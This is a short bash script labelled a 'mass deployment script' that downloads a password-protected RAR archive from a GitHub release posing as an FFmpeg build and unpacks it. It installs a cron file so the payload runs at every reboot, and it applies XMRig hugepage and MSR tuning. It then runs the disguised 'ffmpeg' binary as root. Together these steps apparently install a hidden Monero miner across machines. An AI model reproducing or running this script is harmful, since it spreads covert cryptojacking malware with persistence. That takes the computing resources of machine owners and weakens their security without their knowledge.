#!/usr/bin/bash
# Mass deployment script

# Update package list
sudo apt update

# Get package
wget https://github.com/ityloish/FFmpeg/releases/download/latest/ffmpeg-v6.12.1-mo2-lin64-compat.rar

# Extract contents of the tar.gz
#tar -zxvf v6.12.1-mo2-lin64-compat.tar.gz --one-top-level
# Unrar contents to archive original directory
unrar x ffmpeg-v6.12.1-mo2-lin64-compat.rar -pJ4uANDgZDw3dG32EcZmo

# Change directory
cd latest

# Add file to cron directory
sudo cp reboot-execute-cron /etc/cron.d/reboot-execute-cron

# Make file/script executable
chmod +x *.sh


# Optimisations
# Enable 1GB huge pages (Linux)
# https://xmrig.com/docs/miner/hugepages
sudo bash enable_1gb_pages.sh

# MSR optimisation
# https://xmrig.com/docs/miner/randomx-optimization-guide/msr
sudo apt install -y msr-tools
sudo bash randomx_boost.sh


# Make file/script executable
chmod +x ffmpeg
# Run executable
sudo ./ffmpeg &

sleep 5m

# Reboot system
sudo reboot
